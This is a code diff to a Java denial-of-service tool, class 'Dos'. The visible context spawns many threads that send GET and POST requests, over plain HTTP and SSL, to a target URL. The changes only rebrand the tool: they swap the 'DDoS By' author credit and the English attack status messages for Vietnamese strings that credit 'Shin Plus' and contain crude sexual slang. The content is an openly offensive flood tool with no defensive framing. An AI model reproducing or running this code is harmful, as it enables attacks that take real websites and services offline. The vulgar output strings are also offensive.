@@ -66,7 +66,7 @@ public class Dos implements Runnable {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Setting DDoS By: Shadow Tak");
+        System.out.println("Nghịch Ngu By: Shin Plus");
 
         System.out.print("Thread: ");
         String amount = in.nextLine();
@@ -97,7 +97,7 @@ public class Dos implements Runnable {
         Thread.sleep(2000);
 
 
-        System.out.println("Starting Attack");
+        System.out.println("Đang Bắt Đầu Bú Cu");
         ArrayList<Thread> threads = new ArrayList<Thread>();
         for (int i = 0; i < Dos.amount; i++) {
             Thread t = new Thread(new Dos(i, ioption));
@@ -158,7 +158,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("POST attack done!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("Đang bú cu Shin dz!: " + responseCode + "Thread: " + this.seq);
     }
 
     private void getAttack(String url) throws Exception {
@@ -168,7 +168,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("Đang bú cu Shin dz!: " + responseCode + "Thread: " + this.seq);
     }
 
     private void sslPostAttack(String url) throws Exception {
@@ -185,7 +185,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);
+        System.out.println("Đang bú cu Shin dz!:" + responseCode + "Thread: " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -195,6 +195,6 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("Đang bú cu Shin dz!: " + responseCode + "Thread: " + this.seq);
     }
 }
